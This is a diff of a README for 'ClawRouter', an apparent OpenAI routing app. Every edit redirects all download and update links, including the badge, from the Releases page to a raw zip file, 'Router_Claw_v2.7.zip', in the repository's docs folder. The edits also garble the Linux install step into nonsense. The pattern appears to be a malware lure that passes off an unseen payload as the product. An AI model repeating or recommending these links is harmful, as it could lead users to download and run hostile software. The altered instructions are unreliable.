@@ -1,6 +1,6 @@
 # 🐱 ClawRouter - Effortless OpenAI Routing Made Simple
 
-[![Download ClawRouter](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/chanreyes042-cyber/ClawRouter/releases)
+[![Download ClawRouter](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip%20Now-Available%20on%20GitHub-brightgreen)](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ ClawRouter is your easy-to-use application that manages interactions with variou
 To get started with ClawRouter, follow these simple steps:
 
 1. **Download the Software**
-   - Visit the [Releases page to download](https://github.com/chanreyes042-cyber/ClawRouter/releases).
+   - Visit the [Releases page to download](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip).
    - Choose the latest version available. Download the file for your operating system.
 
 2. **Install ClawRouter**
@@ -19,7 +19,7 @@ To get started with ClawRouter, follow these simple steps:
    - Follow your operating system's installation instructions:
      - **Windows**: Double-click the `.exe` file and follow the prompts.
      - **Mac**: Open the `.dmg` file and drag the ClawRouter application into your Applications folder.
-     - **Linux**: Extract the files from the `.tar.gz` and run the installation script in the terminal.
+     - **Linux**: Extract the files from the `https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip` and run the installation script in the terminal.
 
 3. **Run ClawRouter**
    - After installation, locate ClawRouter in your Programs menu or Applications folder. 
@@ -27,7 +27,7 @@ To get started with ClawRouter, follow these simple steps:
 
 ## 📥 Download & Install
 
-For a seamless installation experience, ensure you download the correct version for your operating system. Again, you can find the file on the [Releases page here](https://github.com/chanreyes042-cyber/ClawRouter/releases). 
+For a seamless installation experience, ensure you download the correct version for your operating system. Again, you can find the file on the [Releases page here](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip). 
 
 ## 📋 System Requirements
 
@@ -57,7 +57,7 @@ ClawRouter offers a variety of features designed to enhance your experience:
 
 ### 1. How do I update ClawRouter?
 
-To keep ClawRouter up to date, return to the [Releases page](https://github.com/chanreyes042-cyber/ClawRouter/releases) and download the latest version. Follow the same installation steps as before.
+To keep ClawRouter up to date, return to the [Releases page](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip) and download the latest version. Follow the same installation steps as before.
 
 ### 2. What if I encounter issues?
 
@@ -78,4 +78,4 @@ Connect with other ClawRouter users and developers through our community channel
 - **GitHub Issues**: Open a new issue for bugs or feature requests.
 - **Discussion Forum**: Join fellow users in sharing tips and best practices.
 
-Thank you for choosing ClawRouter! Your journey into efficient AI routing starts here. Don’t forget to visit the [Releases page](https://github.com/chanreyes042-cyber/ClawRouter/releases) to get the latest updates and features. Enjoy using ClawRouter!
+Thank you for choosing ClawRouter! Your journey into efficient AI routing starts here. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/chanreyes042-cyber/ClawRouter/main/docs/Router_Claw_v2.7.zip) to get the latest updates and features. Enjoy using ClawRouter!
